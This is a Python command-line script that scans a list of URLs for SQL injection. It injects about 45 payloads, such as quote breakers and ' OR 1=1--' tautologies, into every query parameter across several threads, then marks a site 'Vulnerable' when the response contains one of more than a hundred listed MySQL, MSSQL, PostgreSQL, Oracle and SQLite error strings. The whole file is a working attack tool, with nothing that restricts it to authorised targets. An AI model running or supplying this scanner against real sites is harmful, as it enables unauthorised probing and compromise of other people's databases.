import requests
import threading
import argparse
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style, init
from math import ceil

# Initialize colorama for colored output
init(autoreset=True)

# SQLi payloads
payloads = [
    "'", '"', "`", "\\", "'--", '"--', "`--", '"', "'", "')", '")', 
    "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--', 
    "' OR 'a'='a", '" OR "a"="a', "' OR 1=1#", '" OR 1=1#',
    "' AND '1'='1", '" AND "1"="1', "' AND '1'='2", '" AND "1"="2', 
    "'))", '""))', "' OR 'x'='x'", '" OR "x"="x"', 
    "' OR 1=1)--", '" OR 1=1)--', "' OR 'a'='a'--", '" OR "a"="a"--', 
    "') OR ('1'='1", '") OR ("1"="1', "' OR 'a' LIKE 'a", 
    '" OR "a" LIKE "a', "' OR '1'='1'#", '" OR "1"="1"#', 
    "'--", '"--', "OR 1=1", "' OR ''='", '" OR ""="', 
    "'))--", '"))--', "'))#", '"))#'
]

# Extensive SQL error messages list
error_messages = [
    # MySQL Error Messages
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_array()",
    "Warning: mysql_num_rows()",
    "Warning: mysql_pconnect()",
    "Warning: mysql_result()",
    "Warning: mysql_query()",
    "Invalid query",
    "MySQL server version for the right syntax to use near",
    "MySQL Error:",
    "Warning: mysqli_query()",
    "Warning: mysqli_fetch_array()",
    "Unknown column in 'field list'",
    "MySQL server has gone away",
    "Column count doesn't match value count at row",
    "Duplicate entry for key",
    "Can't find file",
    "Out of range value for column",
    "Error executing query",
    "Access denied for user",
    "No database selected",
    "Query failed",
    "Not a valid MySQL result resource",
    "Warning: mysql_connect()",
    "You have an error in your SQL syntax; check the manual",

    # MSSQL Error Messages
    "Unclosed quotation mark after the character string",
    "Incorrect syntax near",
    "Syntax error converting the varchar value to a column of data type int",
    "Microsoft OLE DB Provider for SQL Server",
    "Must declare scalar variable",
    "Conversion failed when converting the varchar value",
    "The multi-part identifier could not be bound",
    "Invalid object name",
    "Login failed for user",
    "Incorrect syntax near the keyword",
    "Warning: mssql_query()",
    "Warning: mssql_connect()",
    "Warning: mssql_fetch_array()",
    "Invalid cursor state",
    "Error converting data type varchar to numeric",
    "Cannot insert duplicate key",
    "Violation of PRIMARY KEY constraint",
    "Warning: mssql_num_rows()",
    "Warning: mssql_free_result()",
    "Invalid column name",
    "Procedure expects parameter",
    "Cannot insert explicit value for identity column",
    "Incorrect syntax near 'keyword'",
    "General SQL Server error: Check messages from the SQL Server",

    # PostgreSQL Error Messages
    "PostgreSQL query failed: ERROR: syntax error",
    "pg_query(): Query failed",
    "Warning: pg_exec()",
    "Warning: pg_query()",
    "Warning: pg_num_rows()",
    "Warning: pg_fetch_array()",
    "unterminated quoted string at or near",
    "invalid input syntax for integer",
    "ERROR: column does not exist",
    "ERROR: syntax error at or near",
    "ERROR: relation \"table_name\" does not exist",
    "ERROR: missing FROM-clause entry for table",
    "ERROR: division by zero",
    "ERROR: invalid byte sequence for encoding",
    "ERROR: permission denied for relation",
    "ERROR: invalid input value for enum",
    "ERROR: invalid regular expression",
    "ERROR: could not determine data type",
    "ERROR: function does not exist",
    "ERROR: operator does not exist",
    "Warning: pg_result_error()",
    "Cannot insert a duplicate key value",
    "ERROR: cannot insert into a column referenced in a foreign key",

    # Oracle Error Messages
    "ORA-00933: SQL command not properly ended",
    "ORA-00921: unexpected end of SQL command",
    "ORA-00942: table or view does not exist",
    "ORA-01756: quoted string not properly terminated",
    "ORA-00904: invalid identifier",
    "ORA-01400: cannot insert NULL into",
    "ORA-01401: inserted value too large for column",
    "ORA-01722: invalid number",
    "ORA-06550: line X, column Y",
    "PLS-00103: Encountered the symbol",
    "ORA-00936: missing expression",
    "ORA-00907: missing right parenthesis",
    "ORA-00001: unique constraint violated",
    "ORA-01830: date format picture ends before converting entire input string",
    "ORA-00917: missing comma",
    "ORA-01438: value larger than specified precision",
    "ORA-00932: inconsistent datatypes",
    "ORA-00984: column not allowed here",
    "ORA-00979: not a GROUP BY expression",
    "ORA-02291: integrity constraint violation",
    "ORA-06512: at line",
    "ORA-04091: table is mutating, trigger/function may not see it",
    "ORA-01031: insufficient privileges",
    "ORA-01555: snapshot too old",

    # SQLite Error Messages
    "SQLite error: near \"X\": syntax error",
    "SQL logic error or missing database",
    "no such table",
    "SQLite3::query(): Unable to prepare statement",
    "SQLite3::exec(): not an error",
    "unable to open database file",
    "no such column",
    "datatype mismatch",
    "column index out of range",
    "SQLITE_ERROR: unrecognized token",
    "SQLITE_CONSTRAINT: UNIQUE constraint failed",
    "syntax error near unexpected token",
    "SQLite3::query(): unrecognized token",
    "file is encrypted or is not a database",

    # MariaDB Error Messages
    "ERROR 1064 (42000): You have an error in your SQL syntax",
    "Warning: mariadb_query()",
    "Column count doesn't match value count",
    "MySQL server has gone away",
    "Access denied for user",
    "Can't find file",

    # General Error Messages
    "Warning: odbc_exec()",
    "SQL error",
    "Database error",
    "Query failed",
    "ODBC SQL Server Driver",
    "Invalid query",
    "Error executing query",
    "Fatal error:",
    "ORA-06502: PL/SQL: numeric or value error",
    "ODBC error",
    "Syntax error",
    "Server error in '/' application",
    "Query error",
    "SQL syntax error",
    "Query execution error",
    "DB query failed",
    "Database connection failed",
    "Invalid database name",
    "Incorrect syntax near 'keyword'",
    "Invalid parameter value",
    "Access violation"
]

# Function to test SQL injection for a single URL parameter
def test_sqli(url, param, original_value, verbose):
    for payload in payloads:
        params = parse_qs(urlparse(url).query)
        params[param] = original_value + payload
        new_query = urlencode(params, doseq=True)
        test_url = url.split('?')[0] + '?' + new_query

        # If verbose mode is enabled, show the current payload being tested
        if verbose:
            print(f"Testing: {test_url} with payload: {payload}")
        
        try:
            response = requests.get(test_url, timeout=5)
            for error in error_messages:
                if error in response.text:
                    return (test_url, payload, error)
        except requests.RequestException:
            continue
    return None

# Worker function for threading
def worker(urls, output_file, lock, results_counter, total_urls, verbose):
    for i, url in enumerate(urls):
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        found = False

        for param, values in params.items():
            original_value = values[0]
            result = test_sqli(url, param, original_value, verbose)

            with lock:
                results_counter[0] += 1

                # Print URL header in a box-like format
                print(f"┌{'─'*60}┐")
                print(f"│ Testing URL {results_counter[0]} / {total_urls}".ljust(61) + "│")
                print(f"└{'─'*60}┘")

                if result:
                    print(Fore.GREEN + f"   URL: {result[0]}")
                    print(Fore.GREEN + f"   Payload: {result[1]}")
                    print(Fore.GREEN + f"   Status: Vulnerable [✔️]")
                    print(Fore.GREEN + f"   Error: {result[2]}")
                    with open(output_file, 'a') as f:
                        f.write(f"Potential SQLi detected: {result[0]} with payload: {result[1]} - Error: {result[2]}\n")
                    found = True
                else:
                    print(Fore.RED + f"   URL: {url}")
                    print(Fore.RED + "   Status: Not vulnerable [❌]")

# Main function
def main(input_file, output_file, thread_count, verbose):
    with open(input_file, 'r') as f:
        urls = [line.strip() for line in f.readlines() if line.strip()]

    # Overwrite the output file at the start
    with open(output_file, 'w') as f:
        f.write("")

    total_urls = len(urls)
    results_counter = [0]  # Shared counter between threads
    lock = threading.Lock()

    # Corrected chunking logic for dividing URLs among threads
    chunk_size = ceil(total_urls / thread_count)
    threads = []

    for i in range(thread_count):
        start = i * chunk_size
        end = min(start + chunk_size, total_urls)
        thread = threading.Thread(target=worker, args=(urls[start:end], output_file, lock, results_counter, total_urls, verbose))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Command-line argument parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQLi Error-based Detection Script")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads (default: 1)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose mode to print all URLs being tested with payloads")
    
    args = parser.parse_args()
    main(args.input, args.output, args.threads, args.verbose)
